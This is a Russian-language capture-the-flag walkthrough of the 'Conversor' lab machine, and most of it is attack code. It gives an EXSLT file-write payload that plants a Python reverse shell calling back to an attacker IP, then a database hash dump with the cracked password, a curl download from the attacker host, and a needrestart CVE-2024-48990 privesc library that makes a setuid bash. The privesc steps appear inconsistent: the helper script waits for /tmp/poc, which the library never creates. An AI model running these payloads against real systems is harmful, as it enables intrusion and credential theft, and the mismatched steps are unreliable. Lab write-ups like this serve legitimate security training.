# conversor

Добавим хост

```bash
echo “10.129.4.210 conversor.htb” | sudo tee -a /etc/hosts
```

Зарегистрируемся валидными данными, например: q:qq. Войдём

Во вкладке about можно скачать Source Code

Откроем файл app.py. Обрати внимание:

```bash
@app.route('/convert', methods=['POST'])
def convert():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    from lxml import etree
    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
    xml_file.save(xml_path)
    xslt_file.save(xslt_path)
    try:
        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
        xml_tree = etree.parse(xml_path, parser)
        xslt_tree = etree.parse(xslt_path)
        transform = etree.XSLT(xslt_tree)
        result_tree = transform(xml_tree)
        result_html = str(result_tree)
        file_id = str(uuid.uuid4())
        filename = f"{file_id}.html"
        html_path = os.path.join(UPLOAD_FOLDER, filename)
        with open(html_path, "w") as f:
            f.write(result_html)
        conn = get_db()
        conn.execute("INSERT INTO files (id,user_id,filename) VALUES (?,?,?)", (file_id, session['user_id'], filename))
        conn.commit()
        conn.close()
        return redirect(url_for('index'))
    except Exception as e:
        return f"Error: {e}"
```

На сайте есть функция /convert, которая позволяет загрузить два файла: .xml, .xslt. Сервер преобразует их в html-страницу.  
Сервер использует библиотеку lxml для обработки .xslt. Разработчик запретил некоторые опасные функции, но забыл запретить EXSLT - расширение для XSLT, которое позволяет выполнять payload, например, записывать файлы прямо на сервер через теги: <exsl:document>, <shell:document>

Также обратим внимание на install.md

```bash
You can also run it with Apache using the app.wsgi file.

If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

Каждую минуту запускаются все файлы .py из /var/www/conversor.htb/scripts/  
Создадим .xslt файл, который использует EXSLT, чтобы записать новый файл

```bash
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" 
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exsl="http://exslt.org/common"
    extension-element-prefixes="exsl">
    <xsl:template match="/">
        <exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import socket,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.81",9004))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
        </exsl:document>
    </xsl:template>
</xsl:stylesheet>
```  

запустим слушателя:

```rlwrap nc -lvnp 9004```  
Загрузим наши .xml и .xslt

Видим в терминале:

```bash
 rlwrap nc -lvnp 9004
Listening on 0.0.0.0 9004
Connection received on 10.129.238.31 54850
```

Извлекаем хэш из бд

```bash
cd /var/www/conversor.htb/instance
sqlite3 users.db "SELECT * FROM users WHERE username='fismathack';"
```

Получим строку с хешем (MD5): ``` 5b5c3ac3a1c897c94caad48e6c71fdec```  
В https://crackstation.net/ получим пароль: ```Keepmesafeandwarm```  
Заходим по SSH:

```bash
ssh fismathack@10.129.238.31
```  

```bash
cat user.txt
```

Первый флаг найден

Дальше нужно повысить привилегии до root

Проверим права sudo

```bash
sudo -l
```

```bash
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

Мы можем запускать /usr/sbin/needrestart от root
Эта утилита, которая проверяет, какие процессы используют старые библиотек после обновления, и предлагает их перезапустить. 
Проверим версию /usr/sbin/needrestart

```bash
/usr/sbin/needrestart -v
```
В нашей версии находим CVE: CVE-2024-48990  
На нашей машине:

Создадим файл lib.c

```bash
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void run(void) {
    if (geteuid() != 0) return;
    setuid(0);
    setgid(0);
    system("cp /bin/bash /tmp/rootbash");
    system("chmod u+s /tmp/rootbash");
}
```
Скомпилируем:

```bash
gcc -shared -fPIC -o __init__.so lib.c
```

На атакуемой машине:

Создадим папку:

```bash
cd /tmp
mkdir rce
cd rce
```

Передадим файл   
На нашей машине:

```bash
python3 -m http.server 8000
```

На атакуемой машине:

```bash
curl -O http://10.10.16.81:8000/__init__.so
```

Создадим файл e.py

```bash
import time
import os

while True:
	try:
		import importlib
	except:
		pass
		
	if os.path.exists("/tmp/poc"):
		print("Shell received")
		os.system("sudo /tmp/poc -p")
		break
	time.sleep(1)

```

Запустим:

```bash
python3 e.py
```

Откроем втором ssh

```bash 
ssh fismathack@10.129.238.31
sudo /usr/sbin/needrestart
```

Увидим в первом терминале:

![img](/image.png)

Флаг:

```bash
cat root.txt
```
